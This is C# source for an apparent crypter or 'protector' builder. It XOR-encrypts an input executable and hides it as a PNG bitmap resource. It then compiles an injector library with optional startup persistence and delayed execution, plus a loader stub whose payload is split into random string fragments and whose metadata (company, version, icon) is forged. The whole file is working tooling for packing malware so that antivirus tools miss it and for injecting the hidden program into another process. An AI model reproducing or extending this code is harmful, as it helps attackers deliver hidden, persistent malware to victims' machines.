using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Resources;
using System.Text;

namespace Dream_Protector_Free
{
    internal class Protector
    {

        internal Logger log;
        internal Random random;

        public Protector(Logger logger)
        {
            log = logger;
            random = new Random();
        }

        private byte[] Xor(byte[] input,byte[] key)
        {
            byte[] n = new byte[input.Length];

            for(int i = 0; i< input.Length; i++)
            {
                n[i] = (byte)(input[i] ^ key[i % key.Length]);
            }

            return n;
        }

        private static Bitmap ConvertTo(byte[] data)
        {
            //each pixel = 4 bytes R G B Alpha

            int pixelCount = (data.Length / 4) + 2;

            int l = (int)Math.Sqrt(pixelCount) + 1;

            int k = 0;

            Bitmap b = new Bitmap(l, l);

            byte[] n = new byte[l * l * 4];

            Buffer.BlockCopy(BitConverter.GetBytes(data.Length), 0, n, 0, 4);

            Buffer.BlockCopy(data, 0, n, 4, data.Length);


            for (int x = 0; x < l; x++)
            {
                for (int y = 0; y < l; y++)
                {
                    int argb = BitConverter.ToInt32(n, k);
                    k += 4;
                    Color c = Color.FromArgb(argb/*n[k++], n[k++], n[k++], n[k++]*/);
                    b.SetPixel(x, y, c);
                }
            }

            return b;

            //first pixel is len of the data




        }

        private static byte[] ConvertFromBmp(Bitmap b)
        {
            int l = b.Width;

            int n = l * l * 4;

            byte[] buff = new byte[n];

            int k = 0;

            for (int x = 0; x < l; x++)
            {
                for (int y = 0; y < l; y++)
                {

                    Buffer.BlockCopy(BitConverter.GetBytes(b.GetPixel(x, y).ToArgb()), 0, buff, k, 4);

                    k += 4;
                }
            }

            int len = BitConverter.ToInt32(buff, 0);

            byte[] f = new byte[len];

            Buffer.BlockCopy(buff, 4, f, 0, f.Length);

            return f;


        }


        public bool Protect(DreamSettings settings,string outputPath)
        {
            string rName = "";

            try
            {
                log.LogInformation("Reading input file...");
                byte[] file = File.ReadAllBytes(settings.FileName);

                byte[] key = new byte[random.Next(16, 32)];

                random.NextBytes(key);

                byte[] enFile = Xor(file, key);

                Bitmap img = ConvertTo(enFile);

                string rId;

                rName = Guid.NewGuid().ToString("N").Substring(0, 5) + ".resources";
                rId = Guid.NewGuid().ToString("N").Substring(0, 5) + ".png";

                ResourceWriter rw = new ResourceWriter(rName);

                rw.AddResource(rId, img);

                log.LogInformation("Generating resources...");

                rw.Generate();
                rw.Close();

                string dllSource;
#if DEBUG
                dllSource = File.ReadAllText(@"..\..\..\..\Library\D.cs");
#else
                dllSource = File.ReadAllText("alpha.dll");
#endif

                dllSource = dllSource.Replace("%TARGET%", settings.InjectionTarget);

                dllSource = dllSource.Replace("%RESNAME%", rName);
                dllSource = dllSource.Replace("%RESID%", rId);

                dllSource = dllSource.Replace("%KEY%", Convert.ToBase64String(key));


                string defines = "";

                if (settings.Install)
                {
                  
                    dllSource = dllSource.Replace("%STARTUPNAME%", settings.InstallName);
                    dllSource = dllSource.Replace("%PROCESSNAME%", settings.ProcessName);

                    defines += "INSTALL;";

                }

                if (settings.Delay)
                {
                    dllSource = dllSource.Replace("%DELAY%", settings.DelaySeconds.ToString("D"));

                    defines += "DELAY;";
                }

                string dllPath = string.Format("{0}.dll", Guid.NewGuid().ToString("N").Substring(0, 5));

                log.LogInformation("Compiling library...");

                if (!Codedom.Compile(dllPath, "cs", new string[] { dllSource }, null, defines, new string[] { "System.Windows.Forms.dll", "System.Drawing.dll" }, null, "library", 20))
                {
                    throw new Exception("Failed to compile library!");
                }

                byte[] dllData = File.ReadAllBytes(dllPath);

                File.Delete(dllPath);

                string stubSource;

#if DEBUG
                stubSource = File.ReadAllText(@"..\..\..\..\Loader\Program.cs");
#else
                stubSource = File.ReadAllText("beta.dll");
#endif

                byte[] key1 = new byte[16];

                random.NextBytes(key1);

                for(int i = 0; i < dllData.Length; i++)
                {
                    dllData[i] = (byte)(dllData[i] ^ key1[i % key1.Length]);
                }

                byte[] buff = new byte[key1.Length + dllData.Length];

                Buffer.BlockCopy(key1, 0, buff, 0, key1.Length);
                Buffer.BlockCopy(dllData, 0, buff, key1.Length, dllData.Length);


                //*STRINGS*/

                string s = BitConverter.ToString(buff).Replace("-", "").ToLowerInvariant();

                List<string> a = new List<string>();
                int ine = 0;
                while(ine < s.Length)
                {
                    int len = random.Next(10, 30);
                    if (ine + len > s.Length) len = s.Length - ine;

                    
                    a.Add(s.Substring(ine, len));
                    ine += len;
                }

                StringBuilder sb = new StringBuilder();

                foreach(string b in a)
                {
                    sb.AppendFormat("strings.Add(\"{0}\");\r\n",b);
                }


                stubSource = stubSource.Replace("/*STRINGS*/", sb.ToString() );

                stubSource = stubSource.Replace("%TITLE%", settings.AssemblyDescription);
                stubSource = stubSource.Replace("%COMPANY%", settings.AssemblyCompany);
                stubSource = stubSource.Replace("%COPYRIGHT%", settings.AssemblyCopyright);
                stubSource = stubSource.Replace("%PRODUCTNAME%", settings.AssemblyProductName);
                stubSource = stubSource.Replace("%VERSION%", settings.AssemblyVersion);

                stubSource = stubSource.Replace("%GUID%", Guid.NewGuid().ToString("D"));

                //replace asm

                log.LogInformation("Compiling loader...");

                if (!Codedom.Compile(outputPath, "cs", new string[] { stubSource }, settings.IconPath, null, new string[] { "System.Windows.Forms.dll", "System.Drawing.dll" }, new string[] { rName}, "winexe", 20))
                {
                    throw new Exception("Failed to compile loader!");
                }

                log.LogSuccess("Succesfully protected.");

                return true;
            }
            catch (Exception ex)
            {
                log.LogError(ex.Message);

                if (File.Exists(rName))
                {
                    try
                    {
                        File.Delete(rName);
                    }
                    catch  { }
                }

                return false;
            }



        }

    }
}
